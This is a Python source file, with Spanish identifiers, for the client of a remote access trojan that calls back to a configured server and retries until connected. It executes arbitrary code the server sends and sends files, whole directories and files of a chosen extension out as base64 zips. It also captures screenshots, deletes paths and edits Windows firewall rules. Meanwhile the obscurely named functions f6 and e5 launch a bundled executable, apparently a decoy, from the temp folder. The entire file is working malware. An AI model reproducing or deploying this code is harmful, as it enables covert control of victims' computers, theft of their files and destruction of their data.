import socket
import threading
import json
import os
import sys
import base64
import time
import traceback
from io import StringIO
import zipfile
import tempfile
import shutil
from PIL import ImageGrab
import subprocess
from config_build import HOST, PORT, EXE_NAME

class ClienteSocket:
    def __init__(self, host='localhost', puerto=5555):
        self.host = host
        self.puerto = puerto
        self.socket_cliente = None
        self.conectado = False
        self.ejecutando = True
        self.reconexion_activa = True
        self.controlador = None
        self._recon_lock = threading.Lock()
        self._recon_thread = None

    def establecer_controlador(self, controlador):
        self.controlador = controlador

    def conectar(self):
        with self._recon_lock:
            if self.conectado or (self._recon_thread and self._recon_thread.is_alive()):
                return
            self._recon_thread = threading.Thread(target=self._loop_conectar, daemon=True)
            self._recon_thread.start()

    def _loop_conectar(self):
        while self.reconexion_activa and self.ejecutando and not self.conectado:
            try:
                self._cerrar_socket()
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(6.0)
                s.connect((self.host, self.puerto))
                s.settimeout(1.0)
                self.socket_cliente = s
                self.conectado = True
                print(f"[+] Conectado al servidor {self.host}:{self.puerto}")
                threading.Thread(target=self._escuchar_servidor, daemon=True).start()
                return
            except (ConnectionRefusedError, OSError):
                print(f"[!] No se pudo conectar. Reintentando en 5 segundos...")
                time.sleep(5)
            except Exception as e:
                print(f"[!] Error al conectar: {e}. Reintentando en 5 segundos...")
                time.sleep(5)

    def _cerrar_socket(self):
        if self.socket_cliente:
            try:
                try:
                    self.socket_cliente.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                self.socket_cliente.close()
            except:
                pass
        self.socket_cliente = None
        self.conectado = False

    def _escuchar_servidor(self):
        while self.ejecutando and self.conectado:
            mensaje = self._recibir_mensaje()
            if mensaje is None:
                break
            if mensaje == "":
                time.sleep(0.05)
                continue
            if self.controlador:
                try:
                    self.controlador.procesar_mensaje(mensaje)
                except Exception as e:
                    print(f"[!] Error en controlador al procesar mensaje del servidor: {e}")
        self._cerrar_socket()
        if self.reconexion_activa and self.ejecutando:
            print("[*] Desconectado del servidor, iniciando reintentos...")
            self.conectar()

    def enviar_mensaje(self, mensaje):
        if not self.conectado or not self.socket_cliente:
            return False
        try:
            if isinstance(mensaje, dict):
                mensaje = json.dumps(mensaje)
            mensaje_bytes = mensaje.encode()
            longitud = len(mensaje_bytes)
            self.socket_cliente.sendall(longitud.to_bytes(4, 'big'))
            self.socket_cliente.sendall(mensaje_bytes)
            return True
        except Exception:
            self._cerrar_socket()
            return False

    def _recibir_mensaje(self):
        try:
            header = self.socket_cliente.recv(4)
            if header == b'':
                return None
            if not header:
                return ""
            longitud = int.from_bytes(header, 'big')
            datos = b''
            while len(datos) < longitud:
                try:
                    parte = self.socket_cliente.recv(min(4096, longitud - len(datos)))
                except socket.timeout:
                    continue
                if parte == b'':
                    return None
                if not parte:
                    return ""
                datos += parte
            return datos.decode()
        except socket.timeout:
            return ""
        except Exception:
            return None

    def cerrar(self):
        self.ejecutando = False
        self.reconexion_activa = False
        self._cerrar_socket()
        print("[+] Conexión cerrada")

class ControladorCliente:
    def __init__(self, cliente_socket):
        self.cliente_socket = cliente_socket
        self.cliente_socket.establecer_controlador(self)
        self.manejadores_acciones = {
            "ejecutar": self._accion_ejecutar,
            "recibir_archivo": self._accion_recibir_archivo,
            "enviar_archivo": self._accion_enviar_archivo,
            "listar_directorio": self._accion_listar_directorio,
            "enviar_directorio": self._accion_enviar_directorio,
            "eliminar": self._accion_eliminar,
            "captura_pantalla": self._accion_captura_pantalla,
            "agregar_regla_firewall": self._accion_agregar_regla_firewall,
            "enviar_archivos_por_extension": self._accion_enviar_archivos_por_extension
        }
    
    def procesar_mensaje(self, mensaje):
        try:
            datos = json.loads(mensaje)
            accion = datos.get("accion")
            
            if accion in self.manejadores_acciones:
                self.manejadores_acciones[accion](datos)
            else:
                print(f"[!] Acción desconocida: {accion}")
                
        except json.JSONDecodeError:
            print(f"[!] Error al decodificar mensaje: {mensaje}")
        except Exception as e:
            print(f"[!] Error al procesar mensaje: {e}")
            traceback.print_exc()
    
    # ============================================================================
    # MÉTODOS AUXILIARES GENERALES
    # ============================================================================
    
    def _enviar_respuesta(self, respuesta):
        """Envía una respuesta al servidor"""
        return self.cliente_socket.enviar_mensaje(respuesta)
    
    def _enviar_respuesta_exitosa(self, accion, **datos_adicionales):
        """Construye y envía una respuesta exitosa con estructura estándar"""
        respuesta = {"accion": accion}
        respuesta.update(datos_adicionales)
        return self._enviar_respuesta(respuesta)
    
    def _enviar_error(self, mensaje_error):
        """Envía una respuesta de error al servidor"""
        self._enviar_respuesta_exitosa("error", mensaje=mensaje_error)
    
    def _validar_ruta_existe(self, ruta, tipo=None):
        """
        Valida que una ruta exista y opcionalmente sea del tipo especificado.
        """
        if not os.path.exists(ruta):
            raise ValueError(f"La ruta no existe: {ruta}")
        
        if tipo == 'file' and not os.path.isfile(ruta):
            raise ValueError(f"La ruta no es un archivo: {ruta}")
        
        if tipo == 'dir' and not os.path.isdir(ruta):
            raise ValueError(f"La ruta no es un directorio: {ruta}")
        
        return True
    
    # ============================================================================
    # MÉTODOS AUXILIARES PARA MANEJO DE ARCHIVOS TEMPORALES
    # ============================================================================
    
    def _crear_archivo_temporal(self, sufijo=''):
        """
        Crea un archivo temporal y retorna su ruta.
        El archivo debe ser eliminado manualmente después de usarse.
        """
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix=sufijo)
        temp_path = temp_file.name
        temp_file.close()
        return temp_path
    
    def _eliminar_archivo_seguro(self, ruta):
        """Elimina un archivo de forma segura sin lanzar excepciones"""
        try:
            if os.path.exists(ruta):
                os.unlink(ruta)
        except Exception as e:
            print(f"[!] Advertencia: No se pudo eliminar archivo temporal {ruta}: {e}")
    
    def _usar_archivo_temporal(self, sufijo, funcion_procesamiento):
        """
        Context manager simulado para usar archivos temporales de forma segura.
        """
        temp_path = self._crear_archivo_temporal(sufijo)
        try:
            return funcion_procesamiento(temp_path)
        finally:
            self._eliminar_archivo_seguro(temp_path)
    
    # ============================================================================
    # MÉTODOS AUXILIARES PARA COMPRESIÓN ZIP
    # ============================================================================
    
    def _crear_zip_directorio(self, ruta_origen, ruta_zip):
        """
        Comprime un directorio completo en un archivo ZIP.
        """
        with zipfile.ZipFile(ruta_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(ruta_origen):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, ruta_origen)
                    zipf.write(file_path, arcname)
    
    def _crear_zip_archivos(self, lista_archivos, ruta_base, ruta_zip):
        """
        Comprime una lista de archivos en un archivo ZIP manteniendo estructura relativa.
        """
        with zipfile.ZipFile(ruta_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for archivo_path in lista_archivos:
                arcname = os.path.relpath(archivo_path, ruta_base)
                zipf.write(archivo_path, arcname)
    
    def _codificar_archivo_base64(self, ruta_archivo):
        """
        Lee un archivo y lo codifica en base64.
        """
        with open(ruta_archivo, "rb") as f:
            return base64.b64encode(f.read()).decode()
    
    def _enviar_zip_al_servidor(self, ruta_zip, nombre_archivo, ruta_destino, accion_respuesta, **datos_extra):
        """
        Codifica un archivo ZIP y lo envía al servidor con metadatos.
        """
        datos_zip = self._codificar_archivo_base64(ruta_zip)
        
        self._enviar_respuesta_exitosa(
            accion_respuesta,
            nombre_archivo=nombre_archivo,
            ruta_destino=ruta_destino,
            datos_zip=datos_zip,
            **datos_extra
        )
    
    # ============================================================================
    # MÉTODOS DE ACCIONES
    # ============================================================================
    
    def _listar_contenido_directorio(self, ruta, incluir_archivos=False):
        try:
            elementos = os.listdir(ruta)
            resultado = []

            for nombre in elementos:
                ruta_completa = os.path.join(ruta, nombre)
                if os.path.isdir(ruta_completa):
                    resultado.append(f"[D] {nombre}")
                elif incluir_archivos and os.path.isfile(ruta_completa):
                    resultado.append(f"[F] {nombre}")

            return "\n".join(resultado) if resultado else "Directorio vacío."

        except Exception as e:
            return f"Error al listar contenido: {str(e)}"
    
    def _agregar_regla_firewall_windows(self, nombre_regla, ip, puerto, accion="block"):
        """Función auxiliar para agregar reglas de firewall en Windows"""
        if accion not in ("allow", "block"):
            raise ValueError("La acción debe ser 'allow' o 'block'")
        
        resultados = []
        
        for direccion in ["in", "out"]:
            nombre_completo = f"{nombre_regla} - {direccion.upper()}"
            
            # Eliminar regla existente si existe
            subprocess.run([
                "netsh", "advfirewall", "firewall", "delete", "rule", f"name={nombre_completo}"
            ], capture_output=True)
            
            # Crear nueva regla
            comando = [
                "netsh", "advfirewall", "firewall", "add", "rule",
                f"name={nombre_completo}",
                f"dir={direccion}",
                f"action={accion}",
                "protocol=TCP",
                f"localport={puerto}",
                f"remoteip={ip}",
                "enable=yes"
            ]
            
            try:
                resultado = subprocess.run(comando, check=True, capture_output=True, text=True)
                mensaje_exito = f"✅ Regla {direccion} agregada correctamente: {resultado.stdout.strip()}"
                resultados.append(mensaje_exito)
                print(mensaje_exito)
            except subprocess.CalledProcessError as e:
                mensaje_error = f"❌ Error al agregar la regla {direccion}: {e.stderr.strip()}"
                resultados.append(mensaje_error)
                print(mensaje_error)
        
        return "\n".join(resultados)
    
    def _accion_ejecutar(self, datos):
        codigo = datos.get("codigo", "")
        print(f"[*] Ejecutando código recibido del servidor...")
        
        try:
            stdout_original = sys.stdout
            salida_capturada = StringIO()
            sys.stdout = salida_capturada
            
            exec(codigo, globals(), {})
            
            sys.stdout = stdout_original
            resultado = salida_capturada.getvalue()
            
            self._enviar_respuesta_exitosa(
                "respuesta_ejecucion",
                resultado=resultado
            )
            
        except Exception as e:
            sys.stdout = stdout_original
            error = f"{type(e).__name__}: {str(e)}\n{traceback.format_exc()}"
            self._enviar_error(f"Error al ejecutar código: {error}")
    
    def _accion_recibir_archivo(self, datos):
        try:
            nombre_archivo = datos.get("nombre_archivo")
            ruta_destino = datos.get("ruta_destino")
            datos_archivo = datos.get("datos_archivo")
            
            print(f"[*] Recibiendo archivo: {nombre_archivo}")
            
            directorio = os.path.dirname(ruta_destino)
            if directorio and not os.path.exists(directorio):
                os.makedirs(directorio)
                
            with open(ruta_destino, "wb") as f:
                f.write(base64.b64decode(datos_archivo))
                
            print(f"[+] Archivo guardado en: {ruta_destino}")
            
            self._enviar_respuesta_exitosa(
                "archivo_recibido",
                nombre_archivo=nombre_archivo,
                ruta_destino=ruta_destino
            )
            
        except Exception as e:
            self._enviar_error(f"Error al recibir archivo: {type(e).__name__}: {str(e)}")
    
    def _accion_enviar_archivo(self, datos):
        try:
            ruta_origen = datos.get("ruta_origen")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando archivo: {ruta_origen}")
            
            self._validar_ruta_existe(ruta_origen, tipo='file')
            
            datos_archivo = self._codificar_archivo_base64(ruta_origen)
            nombre_archivo = os.path.basename(ruta_origen)
            ruta_destino_completa = os.path.join(ruta_destino, nombre_archivo)
            
            self._enviar_respuesta_exitosa(
                "archivo_enviado",
                nombre_archivo=nombre_archivo,
                ruta_destino=ruta_destino_completa,
                datos_archivo=datos_archivo
            )
            
            print(f"[+] Archivo enviado al servidor")
            
        except ValueError as e:
            self._enviar_error(str(e))
        except Exception as e:
            self._enviar_error(f"Error al enviar archivo: {type(e).__name__}: {str(e)}")
    
    def _accion_listar_directorio(self, datos):
        ruta = datos.get("ruta", "")
        incluir_archivos = datos.get("incluir_archivos", False)
        print(f"[*] Listando contenido de: {ruta} (Archivos incluidos: {incluir_archivos})")

        resultado = self._listar_contenido_directorio(ruta, incluir_archivos)

        self._enviar_respuesta_exitosa(
            "respuesta_listado",
            ruta=ruta,
            estructura=resultado
        )
    
    def _accion_enviar_directorio(self, datos):
        try:
            ruta_origen = datos.get("ruta_origen")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando directorio: {ruta_origen}")
            
            self._validar_ruta_existe(ruta_origen, tipo='dir')
            
            def procesar_directorio(temp_zip_path):
                self._crear_zip_directorio(ruta_origen, temp_zip_path)
                
                ruta_normalizada = os.path.normpath(ruta_origen)
                nombre_directorio = os.path.basename(ruta_normalizada)
                
                self._enviar_zip_al_servidor(
                    temp_zip_path,
                    nombre_directorio,
                    ruta_destino,
                    "directorio_enviado",
                    nombre_directorio=nombre_directorio,
                    ruta_origen=ruta_origen
                )
                
                print(f"[+] Directorio enviado al servidor (comprimido)")
            
            self._usar_archivo_temporal('.zip', procesar_directorio)
                    
        except ValueError as e:
            self._enviar_error(str(e))
        except Exception as e:
            self._enviar_error(f"Error al enviar directorio: {type(e).__name__}: {str(e)}")
    
    def _accion_eliminar(self, datos):
        try:
            ruta = datos.get("ruta")
            print(f"[*] Eliminando: {ruta}")

            self._validar_ruta_existe(ruta)

            es_directorio = os.path.isdir(ruta)
            
            if es_directorio:
                shutil.rmtree(ruta)
                mensaje_exito = f"Directorio eliminado: {ruta}"
                tipo = "directorio"
            else:
                os.remove(ruta)
                mensaje_exito = f"Archivo eliminado: {ruta}"
                tipo = "archivo"

            print(f"[+] {mensaje_exito}")

            self._enviar_respuesta_exitosa(
                "eliminacion_exitosa",
                ruta=ruta,
                tipo=tipo,
                mensaje=mensaje_exito
            )

        except ValueError as e:
            self._enviar_error(str(e))
        except PermissionError:
            error = f"Sin permisos para eliminar: {ruta}"
            self._enviar_error(error)
            print(f"[!] {error}")
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al eliminar: {error}")
            print(f"[!] Error al eliminar: {error}")
            
    def _accion_captura_pantalla(self, datos):
        try:
            ruta_destino = datos.get("ruta_destino")
            nombre_archivo = datos.get("nombre_archivo", "captura.png")
            
            print(f"[*] Tomando captura de pantalla...")
            
            screenshot = ImageGrab.grab()
            
            def procesar_captura(temp_path):
                screenshot.save(temp_path, 'PNG')
                
                datos_imagen = self._codificar_archivo_base64(temp_path)
                
                self._enviar_respuesta_exitosa(
                    "captura_enviada",
                    nombre_archivo=nombre_archivo,
                    ruta_destino=ruta_destino,
                    datos_imagen=datos_imagen,
                    ancho=screenshot.width,
                    alto=screenshot.height
                )
                
                print(f"[+] Captura de pantalla enviada al servidor")
            
            self._usar_archivo_temporal('.png', procesar_captura)
                    
        except ImportError:
            error = "La librería PIL (Pillow) no está instalada. Instalar con: pip install Pillow"
            self._enviar_error(error)
            print(f"[!] {error}")
            
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al tomar captura de pantalla: {error}")
            print(f"[!] Error al tomar captura de pantalla: {error}")
    
    def _accion_agregar_regla_firewall(self, datos):
        try:
            nombre_regla = datos.get("nombre_regla")
            ip = datos.get("ip", "any")
            puerto = datos.get("puerto")
            accion = datos.get("accion_firewall", "block")
            
            print(f"[*] Agregando regla de firewall: {nombre_regla}")
            print(f"    IP: {ip}, Puerto: {puerto}, Acción: {accion}")
            
            # Validar parámetros
            if not nombre_regla or not puerto:
                raise ValueError("Nombre de regla y puerto son obligatorios")
            
            # Ejecutar función de firewall
            resultado = self._agregar_regla_firewall_windows(nombre_regla, ip, puerto, accion)
            
            self._enviar_respuesta_exitosa(
                "regla_firewall_agregada",
                nombre_regla=nombre_regla,
                ip=ip,
                puerto=puerto,
                accion_firewall=accion,
                resultado=resultado
            )
            
            print(f"[+] Regla de firewall procesada: {nombre_regla}")
            
        except ValueError as e:
            error = f"Error de validación: {str(e)}"
            self._enviar_error(error)
            print(f"[!] {error}")
            
        except Exception as e:
            error = f"{type(e).__name__}: {str(e)}"
            self._enviar_error(f"Error al agregar regla de firewall: {error}")
            print(f"[!] Error al agregar regla de firewall: {error}")
    
    def _accion_enviar_archivos_por_extension(self, datos):
        try:
            ruta_directorio = datos.get("ruta_directorio")
            extension = datos.get("extension")
            ruta_destino = datos.get("ruta_destino")
            
            print(f"[*] Enviando archivos con extensión '{extension}' desde: {ruta_directorio}")
            
            self._validar_ruta_existe(ruta_directorio, tipo='dir')
            
            # Buscar archivos con la extensión especificada
            archivos_encontrados = []
            for root, dirs, files in os.walk(ruta_directorio):
                for file in files:
                    if file.lower().endswith(extension.lower()):
                        archivos_encontrados.append(os.path.join(root, file))
            
            if not archivos_encontrados:
                raise ValueError(f"No se encontraron archivos con extensión '{extension}' en: {ruta_directorio}")
            
            def procesar_archivos(temp_zip_path):
                self._crear_zip_archivos(archivos_encontrados, ruta_directorio, temp_zip_path)
                
                nombre_zip = f"archivos_{extension.replace('.', '')}.zip"
                
                self._enviar_zip_al_servidor(
                    temp_zip_path,
                    nombre_zip,
                    ruta_destino,
                    "archivos_extension_enviados",
                    extension=extension,
                    cantidad_archivos=len(archivos_encontrados),
                    nombre_zip=nombre_zip,
                    archivos_incluidos=[os.path.basename(f) for f in archivos_encontrados]
                )
                
                print(f"[+] {len(archivos_encontrados)} archivos con extensión '{extension}' enviados al servidor")
            
            self._usar_archivo_temporal('.zip', procesar_archivos)
                    
        except ValueError as e:
            self._enviar_error(str(e))
        except Exception as e:
            self._enviar_error(f"Error al enviar archivos por extensión: {type(e).__name__}: {str(e)}")
    
    def iniciar(self):
        self.cliente_socket.conectar()
    
    def cerrar(self):
        self.cliente_socket.cerrar()
        
class Cliente:
    def __init__(self, host='localhost', puerto=5555):
        self.socket_cliente = ClienteSocket(host, puerto)
        self.controlador = ControladorCliente(self.socket_cliente)
    
    def iniciar(self):
        try:
            self.controlador.iniciar()
            
            while self.socket_cliente.ejecutando:
                if not self.socket_cliente.conectado and not self.socket_cliente.reconexion_activa:
                    break
                time.sleep(1)
                
        except KeyboardInterrupt:
            print("\n[!] Cliente detenido por el usuario")
        except Exception as e:
            print(f"[!] Error fatal: {e}")
        finally:
            self.cerrar()
    
    def ejecutar_f6_seguro(self):
        def wrapper_f6():
            try:
                f6()
            except Exception as e:
                print(f"[!] Error en f6: {e}")
        
        imgth = threading.Thread(target=wrapper_f6, daemon=True)
        imgth.start()
        return imgth
            
    def cerrar(self):
        self.controlador.cerrar()

def e5(r_pth):
    try:
        bs_pth = sys._MEIPASS
    except Exception:
        bs_pth = os.path.abspath(".")
    return os.path.join(bs_pth, r_pth)

def f6():
    ex_pth = e5(EXE_NAME)

    ex_nm = os.path.basename(ex_pth)

    with tempfile.NamedTemporaryFile(delete=False, suffix=".exe", mode='wb') as tmp_file:
        shutil.copy(ex_pth, tmp_file.name)
        tmp_file.close() 
        
        fl_ex_pth = os.path.join(os.path.dirname(tmp_file.name), ex_nm)

        shutil.move(tmp_file.name, fl_ex_pth)

        try:
            os.startfile(fl_ex_pth)
        except Exception:
            pass

def main():
    host = HOST
    puerto = PORT
        
    if len(sys.argv) >= 2:
        host = sys.argv[1]
    if len(sys.argv) >= 3:
        try:
            puerto = int(sys.argv[2])
        except ValueError:
            print(f"[!] Puerto inválido: {sys.argv[2]}")
            sys.exit(1)
    
    try:
        cliente = Cliente(host, puerto)
        thread1 = cliente.ejecutar_f6_seguro()
        cliente.iniciar()
        
    except Exception as e:
        print(f"[!] Error al iniciar cliente: {e}")

if __name__ == "__main__":
    main()